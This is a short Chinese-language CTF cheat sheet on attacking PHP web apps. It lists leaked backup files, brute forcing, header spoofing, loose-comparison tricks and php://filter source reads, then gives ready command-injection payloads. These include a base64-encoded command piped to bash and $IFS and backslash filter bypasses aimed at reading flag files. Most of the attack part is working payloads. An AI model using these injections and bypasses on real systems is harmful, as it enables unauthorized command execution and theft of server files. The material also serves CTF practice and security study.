# PHP

* ## 基础

Robots.txt 查看robots协议规定的网站信息（对网站本身并无实质性影响）

备份源码泄露：www.zip/www.tar.gz/index.php.bak

弱口令爆破：burp抓包后更改爆破点，加载字典进行爆破

X-Forward-For / Referer 伪造 --&gt; X-Forward-For 为最初发起请求的客户端的ip地址，Referer 为当前请求页面的来源页面地址

php弱类型对比（==），不涉及数据转换 --&gt; 0e123==0e456 （典型：md5碰撞）

php伪协议：

```
php://input  //通过post方法将原数据远程上传至服务器
php://filter //通过一些过滤将原数据进行一些操作后下载
?file=php://filter/read=convert.base64-encode/resource=flag.php
        //将flag.php内部源码进行base64编码后给file赋值
```

* ### 命令注入

HTML注入：

```
127.0.0.1;var_dump(scandir('/'));
127.0.0.1;file_get_contents(filename);
```

* #### Bypass

空格绕过 --&gt; 采用&lt;&gt;、/\*\*/、采用特殊变量$IFS

利用反斜杠

```
cat /flag ==> c\at /fl\ag
```

base64编码和解码

```
echo Y2F0IC9mbGFn|base64 -d|bash
```

过滤斜杠 --&gt;利用环境变量进行字符串截取

利用单引号绕过

拼接：

```
/?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
```

编码：

```
/?ip=1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|bash
```

内联：

    /?ip=127.0.0.1;cat$IFS$9`ls`

* #### 



